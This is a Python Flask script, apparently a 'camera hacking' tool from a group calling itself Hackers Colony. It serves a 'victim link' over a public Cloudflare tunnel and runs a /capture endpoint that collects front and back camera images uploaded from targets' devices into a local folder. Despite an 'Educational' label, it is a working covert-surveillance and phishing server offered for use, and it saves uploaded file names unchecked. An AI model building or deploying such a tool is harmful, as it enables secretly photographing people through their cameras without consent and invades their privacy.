#!/usr/bin/env python3
"""
HCO-CAM-TAM - Camera Tool (Educational)
By Azhar (Hackers Colony)
"""

from flask import Flask, request, redirect
import os, time, webbrowser
from colorama import Fore, Style

# ---------------- CONFIG ----------------
CLOUDFLARE_TUNNEL = "https://spirituality-sustainable-normal-bones.trycloudflare.com"
YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
PORT = 8080
TOTAL_IMAGES = 10  # 5 front + 5 back

# Initialize Flask
app = Flask(__name__)

# Ensure 'received' folder exists
if not os.path.exists("received"):
    os.makedirs("received")

# ---------------- HELPERS ----------------
def countdown(seconds=8):
    for i in range(seconds, 0, -1):
        print(Fore.CYAN + f"[+] Unlocking tool in {i}..." + Style.RESET_ALL)
        time.sleep(1)

def display_banner():
    print("\n" + Fore.RED + Style.BRIGHT + "HCO CAM TAM" + Style.RESET_ALL)
    print(Fore.GREEN + "by Azhar - Camera Tool\n" + Style.RESET_ALL)

# ---------------- ROUTES ----------------
@app.route('/')
def index():
    # Step 1: countdown + YouTube redirect
    countdown(8)
    webbrowser.open(YOUTUBE_URL)
    print(Fore.YELLOW + "[*] Redirected to YouTube for subscription..." + Style.RESET_ALL)
    input(Fore.MAGENTA + "[*] Press Enter after returning from YouTube to continue..." + Style.RESET_ALL)
    
    # Step 2: Show banner + victim link
    display_banner()
    print(Fore.CYAN + f"[*] Victim link: {CLOUDFLARE_TUNNEL}" + Style.RESET_ALL)
    
    return f"""
    <h1 style='color:red; font-size:48px;'>HCO CAM TAM</h1>
    <p style='color:green; font-size:18px;'>By Azhar - Camera Tool</p>
    <p>Victim link: <a href='{CLOUDFLARE_TUNNEL}' target='_blank'>{CLOUDFLARE_TUNNEL}</a></p>
    """

@app.route('/capture', methods=['POST'])
def capture():
    files = request.files.getlist('images')
    for f in files:
        filename = f.filename
        f.save(f"received/{filename}")
        print(Fore.GREEN + f"[+] Image received: {filename}" + Style.RESET_ALL)
    
    total_received = len(os.listdir("received"))
    if total_received >= TOTAL_IMAGES:
        print(Fore.RED + f"[!] All {TOTAL_IMAGES} images received!" + Style.RESET_ALL)
    return "Images received!"

# ---------------- MAIN ----------------
if __name__ == "__main__":
    print(Fore.YELLOW + "[*] Cloudflare tunnel live!" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Victim link: {CLOUDFLARE_TUNNEL}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Flask server running on port {PORT}..." + Style.RESET_ALL)
    app.run(host="0.0.0.0", port=PORT, debug=False)
